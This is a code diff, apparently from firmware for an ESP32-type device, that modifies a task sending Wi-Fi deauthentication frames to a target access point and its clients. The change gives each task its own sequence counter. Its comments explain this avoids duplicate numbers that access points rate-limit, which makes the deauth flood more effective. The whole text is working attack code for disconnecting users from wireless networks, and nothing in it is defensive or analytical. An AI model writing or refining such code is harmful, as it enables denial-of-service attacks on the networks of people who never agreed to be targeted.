@@ -100,11 +100,23 @@ static void deauth_task(void *)
     s_deauth_task_alive = true;
     esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
 
+    /* POS-AUDIT-210 / wifi-023: task-local seq counter. s_seq is
+     * file-scope and the 500 ms exit wait at the SPACE-toggle resume
+     * path can't guarantee the prior task fully exited — if it
+     * overran the deadline both tasks would stamp &s_seq concurrently
+     * and produce duplicate sequence numbers (modern APs / clients
+     * rate-limit or drop). Each task now keeps its own counter
+     * primed from s_seq, advancing in its own register-allocated
+     * variable. APs just see two unrelated seq streams; rate-limit
+     * heuristics treat them as separate "spoofs", which is what they
+     * effectively are anyway. */
+    uint16_t seq = s_seq;
+
     while (s_running) {
         /* 1. Broadcast burst — 16 pairs = 32 frames kicks everyone who
          *    isn't PMF-protected. */
         for (int i = 0; i < 16 && s_running; ++i) {
-            int ok = wifi_deauth_broadcast(s_target, &s_seq);
+            int ok = wifi_deauth_broadcast(s_target, &seq);
             s_sent += ok;
             s_errs += (2 - ok);
             delay(3);
@@ -123,7 +135,7 @@ static void deauth_task(void *)
         for (int c = 0; c < n && s_running; ++c) {
             /* 4 pairs per client per round = 8 frames. */
             for (int i = 0; i < 4 && s_running; ++i) {
-                int ok = wifi_deauth_pair(snap[c], s_target, &s_seq);
+                int ok = wifi_deauth_pair(snap[c], s_target, &seq);
                 s_sent += ok;
                 s_errs += (2 - ok);
                 delay(3);
@@ -135,6 +147,9 @@ static void deauth_task(void *)
          * total airtime. */
         if (n == 0) delay(30);
     }
+    /* Write back the local counter so a subsequent resume picks up
+     * the stream where this run left off (cosmetic continuity). */
+    s_seq = seq;
     s_deauth_task_alive = false;
     vTaskDelete(nullptr);
 }
